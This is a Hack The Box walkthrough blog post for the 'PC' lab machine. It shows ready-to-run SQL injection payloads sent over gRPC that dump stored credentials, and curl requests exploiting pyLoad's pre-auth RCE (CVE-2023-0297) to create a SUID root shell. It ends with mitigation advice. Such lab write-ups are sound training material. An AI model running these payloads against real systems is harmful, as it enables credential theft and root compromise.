---
layout: post
title: Hack The Box Walkthrough - PC
date: 2023-07-02
type: post
tags:
- Walkthrough
- Hacking
- HackTheBox
- Easy
- Machine
permalink: /2023/07/HTB/PC
img: 2023/07/PC/PC.png
---

In this box, I had to exploit SQL Injection through gRPC to get SSH credentials. Then exploit a known vulnerability in pyLoad to get root.

* Room: PC
* Difficulty: Easy
* URL: [https://app.hackthebox.com/machines/PC](https://app.hackthebox.com/machines/PC)
* Author: [sau123](https://app.hackthebox.com/users/201596)

## Enumeration

I began by running rustscan to detect open ports on the server.

```bash
$ rustscan -a target -- -A -Pn | tee rust.txt
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/ehogue/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'.
Open 10.10.11.214:22
Open 10.10.11.214:50051
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-02 09:29 EDT
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.

...

Host is up, received user-set (0.054s latency).
Scanned at 2023-07-02 09:29:01 EDT for 13s

PORT      STATE SERVICE REASON  VERSION
22/tcp    open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 91:bf:44:ed:ea:1e:32:24:30:1f:53:2c:ea:71:e5:ef (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQChKXbRHNGTarynUVI8hN9pa0L2IvoasvTgCN80atXySpKMerjyMlVhG9QrJr62jtGg4J39fqxW06LmUCWBa0IxGF0thl2JCw3zyCqq0y8+hHZk0S3Wk9IdNcvd2Idt7SBv7v7x+u/zuDEryDy8aiL1AoqU86YYyiZBl4d2J9HfrlhSBpwxInPjXTXcQHhLBU2a2
NA4pDrE9TxVQNh75sq3+G9BdPDcwSx9Iz60oWlxiyLcoLxz7xNyBb3PiGT2lMDehJiWbKNEOb+JYp4jIs90QcDsZTXUh3thK4BDjYT+XMmUOvinEeDFmDpeLOH2M42Zob0LtqtpDhZC+dKQkYSLeVAov2dclhIpiG12IzUCgcf+8h8rgJLDdWjkw+flh3yYnQKiDYvVC+gwXZdFMay7Ht9ciTBVtDnXpWHVVBpv4C7e
fdGGDShWIVZCIsLboVC+zx1/RfiAI5/O7qJkJVOQgHH/2Y2xqD/PX4T6XOQz1wtBw1893ofX3DhVokvy+nM=
|   256 84:86:a6:e2:04:ab:df:f7:1d:45:6c:cf:39:58:09:de (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPqhx1OUw1d98irA5Ii8PbhDG3KVbt59Om5InU2cjGNLHATQoSJZtm9DvtKZ+NRXNuQY/rARHH3BnnkiCSyWWJc=
|   256 1a:a8:95:72:51:5e:8e:3c:f1:80:f5:42:fd:0a:28:1c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBG1KtV14ibJtSel8BP4JJntNT3hYMtFkmOgOVtyzX/R
50051/tcp open  unknown syn-ack
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port50051-TCP:V=7.94%I=7%D=7/2%Time=64A17BA3%P=x86_64-pc-linux-gnu%r(NU
SF:LL,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0\x06
SF:\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(GenericL
SF:ines,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0\x
SF:06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(GetReq
SF:uest,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0\x
SF:06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(HTTPOp
SF:tions,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0\
SF:x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(RTSPR
SF:equest,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0
SF:\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(RPCC
SF:heck,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0\x
SF:06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(DNSVer
SF:sionBindReqTCP,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\x
SF:ff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0"
SF:)%r(DNSStatusRequestTCP,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\
SF:x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0
SF:\0\?\0\0")%r(Help,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\
SF:?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0
SF:\0")%r(SSLSessionReq,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05
SF:\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\
SF:?\0\0")%r(TerminalServerCookie,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff
SF:\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\
SF:0\0\0\0\0\?\0\0")%r(TLSSessionReq,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\
SF:xff\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08
SF:\0\0\0\0\0\0\?\0\0")%r(Kerberos,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xf
SF:f\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0
SF:\0\0\0\0\0\?\0\0")%r(SMBProgNeg,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xf
SF:f\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0
SF:\0\0\0\0\0\?\0\0")%r(X11Probe,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\
SF:xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0
SF:\0\0\0\0\?\0\0");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 09:29
Completed NSE at 09:29, 0.00s elapsed
```

This box did not have any HTTP port open. It had 22 (SSH), and 50051. I did not know what 50051 was, I tried to connect to it with netcat, but it did not give anything interesting. 


## gRPC

A quick search told me that it was used for [gRPC](https://grpc.io/). A framework for Remote Procedure Call. I found a [series of four posts](https://medium.com/@ibm_ptc_security/grpc-security-series-part-1-c0059362c4b5) that showed how to use it, and potential exploits. 

I installed [gRPCurl](https://github.com/fullstorydev/grpcurl) and started to play with the API.


```bash
$ ./grpcurl -plaintext target:50051 list
SimpleApp
grpc.reflection.v1alpha.ServerReflection

$ ./grpcurl -plaintext target:50051 list SimpleApp
SimpleApp.LoginUser
SimpleApp.RegisterUser
SimpleApp.getInfo

$ ./grpcurl -plaintext target:50051 describe
SimpleApp is a service:
service SimpleApp {
  rpc LoginUser ( .LoginUserRequest ) returns ( .LoginUserResponse );
  rpc RegisterUser ( .RegisterUserRequest ) returns ( .RegisterUserResponse );
  rpc getInfo ( .getInfoRequest ) returns ( .getInfoResponse );
}
grpc.reflection.v1alpha.ServerReflection is a service:
service ServerReflection {
  rpc ServerReflectionInfo ( stream .grpc.reflection.v1alpha.ServerReflectionRequest ) returns ( stream .grpc.reflection.v1alpha.ServerReflectionResponse );
}

$ ./grpcurl -plaintext -msg-template target:50051 describe .LoginUserRequest
LoginUserRequest is a message:
message LoginUserRequest {
  string username = 1;
  string password = 2;
}

Message template:
{
  "username": "",
  "password": ""
}

$ ./grpcurl -plaintext -msg-template target:50051 describe .RegisterUserRequest
RegisterUserRequest is a message:
message RegisterUserRequest {
  string username = 1;
  string password = 2;
}

Message template:
{
  "username": "",
  "password": ""
}

$ ./grpcurl -plaintext -msg-template target:50051 describe .getInfoRequest
getInfoRequest is a message:
message getInfoRequest {
  string id = 1;
}

Message template:
{
  "id": ""
}
```

The API had four methods I could call: RegisterUser, LoginUser, and getInfo. I created a user and logged in with it.

```bash
$ ./grpcurl -plaintext -d '{"username": "test", "password": "test"}' target:50051 SimpleApp/RegisterUser
{
  "message": "Account created for user test!"
}

$ ./grpcurl -plaintext -d '{"username": "test", "password": "test"}' target:50051 SimpleApp/LoginUser
{
  "message": "Your id is 645."
}
```

This worked well. But when I tried to call `getInfo`, I got an error.

```bash
$ ./grpcurl -plaintext -d '{"id": "645"}' target:50051 SimpleApp/getInfo
{
  "message": "Authorization Error.Missing 'token' header"
}
```

I tried using `-H` to send the returned id as a token, but everything I tried failed. I did more research and say that [Postman supports gRPC](https://blog.postman.com/postman-now-supports-grpc/). I installed and tried to use it, but it gave me the same errors.

I needed a token, but the only thing I had was the id returned when I logged in. I went back to gRPCurl documentation, and saw a verbose flag. I gave it a try.

```bash
$ ./grpcurl -v -plaintext -d '{"username": "test", "password": "test"}' target:50051 SimpleApp/LoginUser

Resolved method descriptor:
rpc LoginUser ( .LoginUserRequest ) returns ( .LoginUserResponse );

Request metadata to send:
(empty)

Response headers received:
content-type: application/grpc
grpc-accept-encoding: identity, deflate, gzip

Response contents:
{
  "message": "Your id is 794."
}

Response trailers received:
token: b'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidGVzdCIsImV4cCI6MTY4ODMyMzEyNX0.jlayn5ECWQQxcu9wpLjsfDhmy2SD_n47ojwF4Lhrx44'
Sent 1 request and received 1 response
```

The login method was returning a token. It was not shown in the normal call. I tried using it and I finally got a response.

```bash
$ ./grpcurl -H 'token:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidGVzdCIsImV4cCI6MTY4ODMyMzEyNX0.jlayn5ECWQQxcu9wpLjsfDhmy2SD_n47ojwF4Lhrx44' -plaintext -d '{"id":"794"}'  target:50051 SimpleApp/getInfo
{
  "message": "Will update soon."
}
```

That response was not very useful, but I started playing with the id I was passing in. I had read that gRPC could be vulnerable to SQL Injection, so I gave that a try.

```bash
$ ./grpcurl -H 'token:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidGVzdCIsImV4cCI6MTY4ODMyMzEyNX0.jlayn5ECWQQxcu9wpLjsfDhmy2SD_n47ojwF4Lhrx44' -plaintext -d '{"id":"795"}'  target:50051 SimpleApp/getInfo
ERROR:
  Code: Unknown
  Message: Unexpected <class 'TypeError'>: 'NoneType' object is not subscriptable

$ ./grpcurl -H 'token:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidGVzdCIsImV4cCI6MTY4ODMyMzEyNX0.jlayn5ECWQQxcu9wpLjsfDhmy2SD_n47ojwF4Lhrx44' -plaintext -d '{"id":"1"}'  target:50051 SimpleApp/getInfo
{
  "message": "The admin is working hard to fix the issues."
}

$ ./grpcurl -H 'token:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidGVzdCIsImV4cCI6MTY4ODMyMzEyNX0.jlayn5ECWQQxcu9wpLjsfDhmy2SD_n47ojwF4Lhrx44' -plaintext -d '{"id":"0"}'  target:50051 SimpleApp/getInfo
ERROR:
  Code: Unknown
  Message: Unexpected <class 'TypeError'>: 'NoneType' object is not subscriptable

$ ./grpcurl -H 'token:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidGVzdCIsImV4cCI6MTY4ODMyMzEyNX0.jlayn5ECWQQxcu9wpLjsfDhmy2SD_n47ojwF4Lhrx44' -plaintext -d '{"id":"0+1"}'  target:50051 SimpleApp/getInfo
{
  "message": "The admin is working hard to fix the issues."
}

$ ./grpcurl -H 'token:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidGVzdCIsImV4cCI6MTY4ODMyMzEyNX0.jlayn5ECWQQxcu9wpLjsfDhmy2SD_n47ojwF4Lhrx44' -plaintext -d '{"id":"0+2"}'  target:50051 SimpleApp/getInfo
ERROR:
  Code: Unknown
  Message: Unexpected <class 'TypeError'>: 'NoneType' object is not subscriptable

$ ./grpcurl -H 'token:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidGVzdCIsImV4cCI6MTY4ODMyMzEyNX0.jlayn5ECWQQxcu9wpLjsfDhmy2SD_n47ojwF4Lhrx44' -plaintext -d '{"id":"2 or 1 = 1"}'  target:50051 SimpleApp/getInfo
{
  "message": "The admin is working hard to fix the issues."
}

$ ./grpcurl -H 'token:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidGVzdCIsImV4cCI6MTY4ODMyMzEyNX0.jlayn5ECWQQxcu9wpLjsfDhmy2SD_n47ojwF4Lhrx44' -plaintext -d '{"id":"2 Union Select 1"}'  target:50051 SimpleApp/getInfo
{
  "message": "1"
}
```

The API was vulnerable. I tried to read the version of the database to know what server was used and found it was SQLite.

```bash
$ ./grpcurl -H 'token:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidGVzdCIsImV4cCI6MTY4ODMyMzEyNX0.jlayn5ECWQQxcu9wpLjsfDhmy2SD_n47ojwF4Lhrx44' -plaintext -d "{\"id\":\"2 Union Select sqlite_version()\"}"  target:50051 SimpleApp/getInfo
{
  "message": "3.31.1"
}
```

I used the vulnerability to extract information from the database.

```bash
$ ./grpcurl -H 'token:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidGVzdCIsImV4cCI6MTY4ODMyMzEyNX0.jlayn5ECWQQxcu9wpLjsfDhmy2SD_n47ojwF4Lhrx44' -plaintext -d "{\"id\":\"2 Union Select GROUP_CONCAT(sql, '\n\n') From sqlite_master\"}"  target:50051 SimpleApp/getInfo
{
  "message": "CREATE TABLE \"accounts\" (\n\tusername TEXT UNIQUE,\n\tpassword TEXT\n)\n\nCREATE TABLE messages(id INT UNIQUE, username TEXT UNIQUE,message TEXT)"
}

$ ./grpcurl -H 'token:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidGVzdCIsImV4cCI6MTY4ODMyMzEyNX0.jlayn5ECWQQxcu9wpLjsfDhmy2SD_n47ojwF4Lhrx44' -plaintext -d "{\"id\":\"2 Union Select GROUP_CONCAT(username || ' - ' || password, '\n\n') From accounts\"}"  target:50051 SimpleApp/getInfo
{
  "message": "admin - admin\n\nsau - REDACTED"
}
```

I had some credentials, so I tried them with SSH.

```
$ ssh sau@target
sau@target's password:
Last login: Mon May 15 09:00:44 2023 from 10.10.14.19

sau@pc:~$ ls
user.txt

sau@pc:~$ cat user.txt
REDACTED
```
## Getting Root

Once on the server, I looked at possible escalation routes.

```bash
sau@pc:~$ sudo -l
[sudo] password for sau:
Sorry, user sau may not run sudo on localhost.

sau@pc:~$ find / -perm /u=s 2>/dev/null
/snap/snapd/17950/usr/lib/snapd/snap-confine
/snap/core20/1778/usr/bin/chfn
/snap/core20/1778/usr/bin/chsh
/snap/core20/1778/usr/bin/gpasswd
/snap/core20/1778/usr/bin/mount
/snap/core20/1778/usr/bin/newgrp
/snap/core20/1778/usr/bin/passwd
/snap/core20/1778/usr/bin/su
/snap/core20/1778/usr/bin/sudo
/snap/core20/1778/usr/bin/umount
/snap/core20/1778/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1778/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/at
/usr/bin/su
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/fusermount
/usr/bin/newgrp
/usr/bin/mount
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/umount
/usr/bin/gpasswd
```

I could not run sudo, and I did not see any suspicious suid binaries. I looked at the open ports on the machine and saw that it was listening to port 8000 on localhost.

```bash
sau@pc:/opt/app$ ss -tunl
Netid                   State                    Recv-Q                   Send-Q                                     Local Address:Port                                      Peer Address:Port                   Process
udp                     UNCONN                   0                        0                                          127.0.0.53%lo:53                                             0.0.0.0:*
udp                     UNCONN                   0                        0                                                0.0.0.0:68                                             0.0.0.0:*
tcp                     LISTEN                   0                        4096                                       127.0.0.53%lo:53                                             0.0.0.0:*
tcp                     LISTEN                   0                        128                                              0.0.0.0:22                                             0.0.0.0:*
tcp                     LISTEN                   0                        5                                              127.0.0.1:8000                                           0.0.0.0:*
tcp                     LISTEN                   0                        128                                              0.0.0.0:9666                                           0.0.0.0:*
tcp                     LISTEN                   0                        128                                                 [::]:22                                                [::]:*
tcp                     LISTEN                   0                        4096                                                   *:50051                                                *:*
```

I created an SSH tunnel to allow accessing it from my machine.

```bash
ssh -L 8001:localhost:8000 sau@target
```

And I opened it in my browser.

![pyLoad](/assets/images/2023/07/PC/pyLoad.png "pyLoad")

It was an instance of [pyLoad](https://pyload.net/), a download manager. I tried using the credentials I found earlier, they failed.

I checked for known vulnerabilities and found an [unauthenticated Remote Code Execution](https://github.com/bAuh0lz/CVE-2023-0297_Pre-auth_RCE_in_pyLoad).


I took the example request and ran it on the server to see if it worked.

```bash
sau@pc:/opt/app$ curl -i -s -k -X $'POST' \
    --data-binary $'jk=pyimport%20os;os.system(\"touch%20/tmp/pwnd\");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa' \
    $'http://localhost:8000/flash/addcrypted2'

sau@pc:/opt/app$ ls -l /tmp/pwnd
-rw-r--r-- 1 root root 0 Jul  2 17:38 /tmp/pwnd
```

It did! And the file was owned by root. I modified the example to copy bash in `/tmp` and set the suid bit on it.

```bash
sau@pc:/opt/app$ curl -i -s -k -X $'POST' \
    --data-binary $'jk=pyimport%20os;os.system(\"cp%20/bin/bash%20/tmp/\");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa' \
    $'http://localhost:8000/flash/addcrypted2'

HTTP/1.1 500 INTERNAL SERVER ERROR
Content-Type: text/html; charset=utf-8
Content-Length: 21
Access-Control-Max-Age: 1800
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: OPTIONS, GET, POST
Vary: Accept-Encoding
Date: Sun, 02 Jul 2023 17:40:03 GMT
Server: Cheroot/8.6.0

Could not decrypt key

sau@pc:/opt/app$ ls -l /tmp/bash
-rwxr-xr-x 1 root root 1183448 Jul  2 17:40 /tmp/bash


sau@pc:/opt/app$ curl -i -s -k -X $'POST' \
    --data-binary $'jk=pyimport%20os;os.system(\"chmod%20u%2Bs%20/tmp/bash\");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa' \
    $'http://localhost:8000/flash/addcrypted2'

sau@pc:/opt/app$ ls -l /tmp/bash
-rwsr-xr-x 1 root root 1183448 Jul  2 17:44 /tmp/bash
```

Finally, I used the suid bash to become root and read the flag.

```bash
sau@pc:/opt/app$ /tmp/bash -p

bash-5.0# whoami
root

bash-5.0# cat /root/root.txt
REDACTED
```

## Mitigation

The code behind the gRPC server appends data from the user directly in SQL queries. It should use [parameter substitutions](https://docs.python.org/3/library/sqlite3.html#how-to-use-placeholders-to-bind-values-in-sql-queries) to prevent SQL Injection.

The second issue is with pyLoad. The vulnerability has been fixed, so updating the application would have prevented the privilege escalation.